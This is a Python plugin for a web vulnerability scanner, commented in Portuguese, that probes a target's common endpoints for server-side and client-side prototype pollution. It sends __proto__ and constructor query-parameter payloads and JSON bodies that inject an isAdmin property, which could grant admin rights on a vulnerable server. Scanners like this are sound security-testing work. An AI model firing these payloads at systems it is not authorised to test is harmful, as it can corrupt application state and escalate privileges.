# plugins/prototype_pollution.py
def run(target, ip, open_ports, banners):
    """
    Scanner Prototype Pollution (Client-side e Server-side).
    Tendência 2026: um dos vetores mais explorados em aplicações Node.js/Express.
    Testa injeção de propriedades via __proto__, constructor, prototype em params.
    """
    import requests

    payloads = [
        ("__proto__[test]", "cascavel_pp", "QUERY_PARAM"),
        ("__proto__.test", "cascavel_pp", "DOT_NOTATION"),
        ("constructor[prototype][test]", "cascavel_pp", "CONSTRUCTOR"),
        ("__proto__", '{"test":"cascavel_pp"}', "JSON_BODY"),
    ]

    endpoints = ["/", "/api/", "/api/v1/", "/login", "/register", "/search", "/update"]
    vulns = []

    for ep in endpoints:
        # 1. GET param injection
        for param, value, method in payloads:
            if method == "JSON_BODY":
                continue  # JSON testado separadamente
            url = f"http://{target}{ep}?{param}={value}"
            try:
                resp = requests.get(url, timeout=5)
                # Se o servidor retorna JSON com a propriedade injetada
                if resp.status_code == 200 and "cascavel_pp" in resp.text:
                    try:
                        data = resp.json()
                        if isinstance(data, dict) and "test" in data:
                            vulns.append({
                                "tipo": "PROTOTYPE_POLLUTION_SERVER",
                                "endpoint": ep,
                                "metodo": method,
                                "severidade": "CRITICO",
                                "descricao": "Server-side prototype pollution confirmado"
                            })
                    except Exception:
                        pass
                # Verificar reflexão no HTML (client-side)
                if resp.status_code == 200 and "__proto__" in resp.text:
                    vulns.append({
                        "tipo": "PROTOTYPE_POLLUTION_REFLECTED",
                        "endpoint": ep,
                        "metodo": method,
                        "severidade": "MEDIO",
                        "descricao": "Parâmetro __proto__ refletido na resposta"
                    })
            except Exception:
                continue

        # 2. POST JSON body injection
        json_payloads = [
            {"__proto__": {"isAdmin": True, "test": "cascavel_pp"}},
            {"constructor": {"prototype": {"isAdmin": True}}},
        ]
        for payload in json_payloads:
            try:
                resp = requests.post(
                    f"http://{target}{ep}", json=payload, timeout=5,
                    headers={"Content-Type": "application/json"}
                )
                if resp.status_code == 200 and "cascavel_pp" in resp.text:
                    vulns.append({
                        "tipo": "PROTOTYPE_POLLUTION_JSON",
                        "endpoint": ep,
                        "severidade": "CRITICO",
                        "descricao": "JSON body prototype pollution confirmado"
                    })
            except Exception:
                continue

    return {
        "plugin": "prototype_pollution",
        "resultados": vulns if vulns else "Nenhum prototype pollution detectado"
    }
